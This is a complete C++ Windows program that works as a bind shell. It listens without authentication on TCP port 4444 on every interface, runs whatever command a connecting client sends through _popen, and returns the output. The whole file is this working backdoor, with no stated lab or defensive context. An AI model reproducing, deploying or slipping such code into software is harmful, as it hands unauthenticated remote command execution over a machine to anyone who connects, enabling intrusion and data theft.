#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <memory>

#pragma comment(lib, "ws2_32.lib")

void error(const char* msg) {
    std::cerr << msg << std::endl;
    exit(1);
}

int main() {
    WSADATA wsaData;
    SOCKET listenSocket, clientSocket;
    sockaddr_in serverAddr, clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    char recvbuf[1024];
    int recvResult;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        error("WSAStartup failed.");
    }

    // Create a listening socket
    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        error("Socket creation failed.");
    }

    // Set up the server address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
    serverAddr.sin_port = htons(4444); // Port to listen on

    // Bind the socket to the address and port
    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        error("Bind failed.");
    }

    // Listen for incoming connections
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        error("Listen failed.");
    }

    std::cout << "Server is listening on port 4444...\n";

    // Accept incoming connection
    clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);
    if (clientSocket == INVALID_SOCKET) {
        error("Accept failed.");
    }

    std::cout << "Client connected.\n";

    // Communication loop
    while (true) {
        // Clear the receive buffer
        memset(recvbuf, 0, sizeof(recvbuf));

        // Receive data from the client
        recvResult = recv(clientSocket, recvbuf, sizeof(recvbuf) - 1, 0);
        if (recvResult > 0) {
            std::cout << "Received command: " << recvbuf << std::endl;

            // Execute the command and send the output back to the client
            FILE* pipe = _popen(recvbuf, "r");
            if (pipe) {
                while (fgets(recvbuf, sizeof(recvbuf) - 1, pipe) != NULL) {
                    send(clientSocket, recvbuf, strlen(recvbuf), 0);
                }
                _pclose(pipe);
            } else {
                const char* errorMsg = "Failed to execute command.";
                send(clientSocket, errorMsg, strlen(errorMsg), 0);
            }
        } else if (recvResult == 0) {
            std::cout << "Client disconnected.\n";
            break;
        } else {
            error("Receive failed.");
        }
    }

    // Clean up
    closesocket(clientSocket);
    closesocket(listenSocket);
    WSACleanup();

    return 0;
}
